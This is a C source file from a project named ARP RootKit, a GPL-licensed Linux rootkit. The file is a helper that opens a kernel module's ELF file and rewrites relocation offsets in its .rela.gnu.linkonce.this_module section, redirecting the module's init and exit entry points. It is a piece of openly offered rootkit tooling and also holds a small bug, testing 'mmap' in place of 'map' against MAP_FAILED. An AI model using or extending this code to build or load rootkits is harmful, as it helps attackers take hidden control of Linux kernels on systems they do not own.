/***
 *      _  __  __     __
 *     /_) )_) )_)    )_) _   _  _)_ )_/ o _)_
 *    / / / \ /      / \ (_) (_) (_ /  ) ( (_
 *
 *//* License
 *
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 *//* Notes 
 *
 * This code patches the .rela.gnu.linkonce.this_module section of and LKM,
 * to point offsets inside .gnu.linkonce.this_module, to the module functions:
 * module_init and module_cleanup (I guess). Depending on the Linux Kernel,
 * where the module is going to run.
 *
 */

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <elf.h>

int main(int argc, char *argv[]) {
	int fd = 0, i = 0, tree = 0, print = 0, j = 0;
	size_t map_sz = 0;
	void *map = NULL;
	char *shstrtab = NULL, *lkm = NULL;
	Elf64_Ehdr *elf = NULL;
	Elf64_Shdr *sec = NULL;
	Elf64_Rela *rela = NULL;
	Elf64_Off r0_off = 0, r1_off = 0;

	if (argc < 3) {
		fprintf(stderr, "use: %s <-v|-p> <lkm> [init_offset, exit_offset]\n", argv[0]);
		return -1;
	}

	if (strncmp(argv[1], "-v", 2) == 0) {
		print = 1;
		lkm = argv[2];
	} else if (strncmp(argv[1], "-p", 2) == 0) {
		if (argc < 5) {
			fprintf(stderr, "with %s, must specify init_offset and exit_offset.\n", argv[1]);
			return -1;
		}

		r0_off = atoi(argv[2]);
		r1_off = atoi(argv[3]);
		lkm = argv[4];
		if (r0_off <= 0 || r1_off <= 0) {
			fprintf(stderr, "invalid offset: init = %ld, exit = %ld\n", r0_off, r1_off);
			return -1;
		} 
	}

	fd = open (lkm, O_RDWR);
	if (fd < 0) {
		perror("open");
		return fd;
	}

	map_sz = lseek(fd, 0, SEEK_END);
	lseek(fd, 0, SEEK_SET);
	map = mmap(0, map_sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (mmap == MAP_FAILED) {
		perror("mmap");
		return -1;
	}

	elf = map;
	sec = map + elf->e_shoff + elf->e_shstrndx * sizeof(Elf64_Shdr);
	shstrtab = map + sec->sh_offset;
	sec = map + elf->e_shoff;
	for (i = 0; i < elf->e_shnum; i++) {
		if (strncmp(".rela.gnu.linkonce.this_module", shstrtab + sec[i].sh_name, 30) == 0) {
			rela = map + sec[i].sh_offset;
			if (!print) {
				rela[0].r_offset = r0_off;
				rela[1].r_offset = r1_off;
			} else {
				for (j = 0; j < sec[i].sh_size / sizeof(Elf64_Rela); j++) {
					printf("%ld\n0x%lx\n", rela[j].r_offset, rela[j].r_info);
				}
			}
			break;
			//printf("%s\n", shstrtab + sec[i].sh_name);
		}
	}

	//sec = map + elf->e_shoff + sizeof(Elf64_Shdr) * 16;
	//printf("%ld\n", sec->sh_addralign);
	//sec->sh_addralign = 32;
	//sec = map + elf->e_shoff + sizeof(Elf64_Shdr) * 17;
	//printf("%ld\n", sec->sh_addralign);
	//sec->sh_addralign = 8;
	//sec = map + elf->e_shoff + sizeof(Elf64_Shdr) * 19;
	//printf("%u\n", sec->sh_info);
	//sec->sh_info = 384;
	//sec = map + elf->e_shoff + sizeof(Elf64_Shdr) * 12;
	//rela = map + sec->sh_offset;
	//rela[0].r_offset = 0x180;
	//rela[0].r_info   = 0x1bf00000001;
	//rela[1].r_offset = 0x330;
	//rela[1].r_info   = 0x1a500000001;
	//for (i = 0; i < sec->sh_size / sizeof(Elf64_Rela); i++) {
	//	printf("offset: %lx\n", rela[i].r_offset);
	//	printf("info:   %lx\n", rela[i].r_info);
	//	printf("addend: %lx\n", rela[i].r_addend);
	//}

	if (msync(map, map_sz, MS_SYNC) < 0) {
		perror("msync");
		return -1;
	}

	if (munmap(map, map_sz) < 0) {
		perror("munmap");
		return -1;
	}

	close(fd);

	return 0;
}
